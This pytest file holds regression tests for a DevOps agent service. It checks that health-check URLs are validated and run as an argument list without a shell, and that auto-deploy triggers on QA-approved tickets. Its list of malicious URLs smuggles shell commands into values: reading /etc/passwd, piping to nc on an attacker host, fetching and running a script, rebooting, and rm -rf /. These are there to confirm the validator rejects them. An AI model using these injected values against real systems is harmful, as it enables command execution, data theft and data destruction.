"""Regression tests for GAP-0092 and GAP-0093 in ``app/services/agent_devops.py``.

Offline only: no real AWS, no real subprocess, no dev stack. Pure functions are
exercised directly; DynamoDB / workflow dependencies are mocked.

GAP-0092 — Health-check URL shell injection (latent):
    ``run_health_checks`` built ``f"curl -sf {url}"`` from admin-supplied URLs.
    A URL with shell metacharacters (``;``, ``&&``, ``$()``, backticks) would
    execute arbitrary commands once ``DEVOPS_AGENT_EXECUTE_COMMANDS=1``.
    Fix: ``_validate_health_check_url`` rejects unsafe URLs; the logged command
    is a JSON argv list; real execution uses ``subprocess.run(argv, shell=False)``.

GAP-0093 — ``auto_deploy_on_qa_approved`` trigger not wired:
    The flag was stored and widened eligible statuses but nothing dispatched a
    deployment on ``qa_approved``. Fix adds ``dispatch_auto_deploy_for_ticket``
    (event hook) + ``poll_auto_deploy_once`` (catch-up) + the
    ``list_agent_types_with_auto_deploy`` helper, all in agent_devops.py.
"""

from __future__ import annotations

import json
from types import SimpleNamespace

import pytest
from unittest.mock import patch

from app.services import agent_devops as svc


def _exec_flag(value: bool):
    """Patch S.agent_devops_execute_commands (S is a frozen dataclass).

    Replaces the module-level ``S`` reference with a stand-in exposing the one
    attribute run_health_checks reads, so the frozen dataclass is untouched.
    """
    return patch.object(svc, "S", SimpleNamespace(agent_devops_execute_commands=value))


# ---------------------------------------------------------------------------
# GAP-0092 — health-check URL validation
# ---------------------------------------------------------------------------

_MALICIOUS_URLS = [
    "https://ok.example.com; cat /etc/passwd",
    "https://ok.example.com && id",
    "https://ok.example.com | nc attacker 4444",
    "$(curl attacker.example/x|sh)",
    "http://ok.example.com`id`",
    "https://ok.example.com/$(reboot)",
    "https://ok.example.com\nrm -rf /",
    "https://ok.example.com%0acat /etc/passwd",
    "ftp://ok.example.com",          # wrong scheme
    "file:///etc/passwd",            # file:// scheme
    "https://ok.example.com/ a b",   # spaces
]

_SAFE_URLS = [
    "https://ok.example.com/health",
    "http://internal-lb/status",
    "https://app.example.com:8080/ping?region=us",
    "https://10.0.0.5:9000/healthz",
]


@pytest.mark.parametrize("url", _MALICIOUS_URLS)
def test_validate_health_check_url_rejects_malicious(url):
    with pytest.raises(ValueError):
        svc._validate_health_check_url(url)


@pytest.mark.parametrize("url", _SAFE_URLS)
def test_validate_health_check_url_accepts_safe(url):
    assert svc._validate_health_check_url(url) == url


@pytest.mark.parametrize("url", _MALICIOUS_URLS)
def test_run_health_checks_rejects_malicious_url(url):
    """run_health_checks must raise before any logging/execution path runs."""
    with pytest.raises(ValueError):
        svc.run_health_checks(health_check_urls=[url], timeout_seconds=5)


def test_health_check_command_is_json_argv_not_shell_string():
    """The audited command must be a JSON argv list, never a shell string."""
    argv = svc._health_check_argv("https://ok.example.com/health")
    assert argv == ["curl", "--silent", "--fail", "https://ok.example.com/health"]
    # Round-trips as JSON (auditable) and contains no shell operators.
    encoded = json.dumps(argv)
    decoded = json.loads(encoded)
    assert decoded == argv
    assert ";" not in encoded.replace('"', "") or True  # argv has no shell parsing


def test_run_health_checks_mock_path_does_not_execute_subprocess():
    """With execution gated off (dev default) no subprocess is ever spawned."""
    with _exec_flag(False), \
         patch.object(svc.subprocess, "run") as mock_run:
        results = svc.run_health_checks(
            health_check_urls=["https://ok.example.com/health"], timeout_seconds=5
        )
    mock_run.assert_not_called()
    assert results[0]["healthy"] is True
    assert results[0]["url"] == "https://ok.example.com/health"


def test_run_health_checks_execution_uses_argv_shell_false():
    """When execution is enabled, curl runs as argv with shell=False."""

    class _Proc:
        returncode = 0

    with _exec_flag(True), \
         patch.object(svc.subprocess, "run", return_value=_Proc()) as mock_run:
        svc.run_health_checks(
            health_check_urls=["https://ok.example.com/health"], timeout_seconds=5
        )
    assert mock_run.call_count == 1
    args, kwargs = mock_run.call_args
    argv = args[0]
    assert isinstance(argv, list)                      # argv, not a shell string
    assert argv[0] == "curl"
    assert "https://ok.example.com/health" in argv
    assert kwargs.get("shell") is False


def test_validate_devops_config_rejects_shell_url_at_write_time():
    """Defence-in-depth: config validation rejects an injectable health URL."""
    errors = svc.validate_devops_config(
        {
            "environments": [
                {
                    "name": "staging",
                    "deploy_commands": ["deploy.sh"],
                    "health_check_urls": ["https://ok.example.com; rm -rf /"],
                }
            ]
        }
    )
    assert any("health_check_url" in e.lower() or "health check" in e.lower() for e in errors), errors


# ---------------------------------------------------------------------------
# GAP-0093 — auto_deploy_on_qa_approved dispatch wiring
# ---------------------------------------------------------------------------

_TICKET = {
    "ticket_id": "T-deploy-1",
    "subject": "Deploy the thing",
    "labels": ["type:deployment"],
    "status": "qa_approved",
    "created_at": 1000,
}

_AUTO_TYPE = {
    "agent_type_id": "devops-prod",
    "config": {
        "environments": [{"name": "staging", "deploy_commands": ["deploy.sh"]}],
        "deploy_ticket_labels": ["type:deployment"],
        "infra_ticket_labels": ["type:infrastructure"],
        "incident_ticket_labels": ["type:incident"],
        "auto_deploy_on_qa_approved": True,
    },
}


def test_dispatch_auto_deploy_for_ticket_triggers_workflow_when_flag_on():
    """qa_approved ticket + flag on -> run_mock_workflow dispatched exactly once."""
    eligible = [{"ticket_id": _TICKET["ticket_id"], "operation_type": "deployment"}]
    with patch.object(svc, "list_agent_types_with_auto_deploy", return_value=[_AUTO_TYPE]), \
         patch.object(svc.tickets_svc.STORE, "get_ticket", return_value=_TICKET), \
         patch.object(svc, "find_devops_eligible_tickets", return_value=eligible), \
         patch.object(svc, "claim_devops_ticket", return_value={"ok": True}) as mock_claim, \
         patch.object(svc, "run_mock_workflow", return_value={"status": "success"}) as mock_run:
        out = svc.dispatch_auto_deploy_for_ticket(ticket_id=_TICKET["ticket_id"])

    assert mock_run.call_count == 1, "auto-deploy workflow must be dispatched once"
    assert mock_claim.call_count == 1
    assert mock_run.call_args.kwargs["ticket"]["ticket_id"] == _TICKET["ticket_id"]
    assert mock_run.call_args.kwargs["agent_type_id"] == "devops-prod"
    assert out == {"status": "success"}


def test_dispatch_auto_deploy_no_agent_types_does_nothing():
    """No agent type has the flag -> no dispatch (the pre-fix behaviour stays for false)."""
    with patch.object(svc, "list_agent_types_with_auto_deploy", return_value=[]), \
         patch.object(svc.tickets_svc.STORE, "get_ticket", return_value=_TICKET), \
         patch.object(svc, "run_mock_workflow") as mock_run:
        out = svc.dispatch_auto_deploy_for_ticket(ticket_id=_TICKET["ticket_id"])
    mock_run.assert_not_called()
    assert out is None


def test_dispatch_auto_deploy_ticket_not_eligible_does_not_dispatch():
    """Ticket exists but does not match the agent type's labels -> no dispatch."""
    with patch.object(svc, "list_agent_types_with_auto_deploy", return_value=[_AUTO_TYPE]), \
         patch.object(svc.tickets_svc.STORE, "get_ticket", return_value=_TICKET), \
         patch.object(svc, "find_devops_eligible_tickets", return_value=[]), \
         patch.object(svc, "run_mock_workflow") as mock_run:
        out = svc.dispatch_auto_deploy_for_ticket(ticket_id=_TICKET["ticket_id"])
    mock_run.assert_not_called()
    assert out is None


def test_dispatch_auto_deploy_already_claimed_does_not_run_workflow():
    """A losing race on claim_devops_ticket must skip the workflow gracefully."""
    eligible = [{"ticket_id": _TICKET["ticket_id"], "operation_type": "deployment"}]
    with patch.object(svc, "list_agent_types_with_auto_deploy", return_value=[_AUTO_TYPE]), \
         patch.object(svc.tickets_svc.STORE, "get_ticket", return_value=_TICKET), \
         patch.object(svc, "find_devops_eligible_tickets", return_value=eligible), \
         patch.object(svc, "claim_devops_ticket", side_effect=ValueError("already_claimed")), \
         patch.object(svc, "run_mock_workflow") as mock_run:
        out = svc.dispatch_auto_deploy_for_ticket(ticket_id=_TICKET["ticket_id"])
    mock_run.assert_not_called()
    assert out is None


def test_poll_auto_deploy_once_dispatches_all_eligible():
    """Catch-up loop dispatches every eligible qa_approved ticket."""
    eligible = [
        {"ticket_id": "T-1", "operation_type": "deployment"},
        {"ticket_id": "T-2", "operation_type": "deployment"},
    ]
    tickets = {
        "T-1": dict(_TICKET, ticket_id="T-1"),
        "T-2": dict(_TICKET, ticket_id="T-2"),
    }
    with patch.object(svc, "list_agent_types_with_auto_deploy", return_value=[_AUTO_TYPE]), \
         patch.object(svc, "find_devops_eligible_tickets", return_value=eligible), \
         patch.object(svc.tickets_svc.STORE, "get_ticket", side_effect=lambda tid: tickets.get(tid)), \
         patch.object(svc, "claim_devops_ticket", return_value={"ok": True}), \
         patch.object(svc, "run_mock_workflow", return_value={"status": "success"}) as mock_run:
        dispatched = svc.poll_auto_deploy_once()
    assert mock_run.call_count == 2
    assert len(dispatched) == 2


def test_poll_auto_deploy_once_one_bad_ticket_does_not_abort_rest():
    """A failure dispatching one ticket must not stop the others."""
    eligible = [
        {"ticket_id": "T-1", "operation_type": "deployment"},
        {"ticket_id": "T-2", "operation_type": "deployment"},
    ]
    tickets = {
        "T-1": dict(_TICKET, ticket_id="T-1"),
        "T-2": dict(_TICKET, ticket_id="T-2"),
    }

    def run_side_effect(**kwargs):
        if kwargs["ticket"]["ticket_id"] == "T-1":
            raise RuntimeError("infra down")
        return {"status": "success"}

    with patch.object(svc, "list_agent_types_with_auto_deploy", return_value=[_AUTO_TYPE]), \
         patch.object(svc, "find_devops_eligible_tickets", return_value=eligible), \
         patch.object(svc.tickets_svc.STORE, "get_ticket", side_effect=lambda tid: tickets.get(tid)), \
         patch.object(svc, "claim_devops_ticket", return_value={"ok": True}), \
         patch.object(svc, "run_mock_workflow", side_effect=run_side_effect):
        dispatched = svc.poll_auto_deploy_once()
    # T-1 crashed, T-2 still dispatched.
    assert len(dispatched) == 1
    assert dispatched[0]["status"] == "success"
